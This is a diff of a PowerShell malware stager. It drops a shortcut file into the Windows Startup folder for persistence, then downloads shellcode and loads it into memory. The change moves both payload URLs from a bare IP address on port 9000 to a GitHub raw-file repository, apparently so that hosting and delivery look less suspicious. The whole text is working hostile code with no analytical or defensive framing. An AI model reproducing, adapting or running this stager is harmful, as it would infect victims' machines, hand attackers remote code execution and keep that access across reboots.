@@ -1,6 +1,6 @@
 try {
     #/// SAVE THE .LNK FILE TO STARTUP FOLDER \\#
-    $lnkUrl = "http://65.38.121.31:9000/lnk-no-img.lnk"
+    $lnkUrl = "https://github.com/j43140027/752384324/raw/refs/heads/master/lnk-no-img.lnk"
     $startupFolder = [System.Environment]::GetFolderPath('Startup')  # Get the Startup folder path
     $lnkPath = "$startupFolder\lnk-no-img.lnk"
 
@@ -27,7 +27,7 @@ try {
     }
 
     # Download and load shellcode directly into memory
-    $shellcodeUrl = "http://65.38.121.31:9000/loader.bin"
+    $shellcodeUrl = "https://github.com/j43140027/752384324/raw/refs/heads/master/loader.bin"
     $shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -UseBasicParsing).Content
 
     # Allocate memory for the shellcode
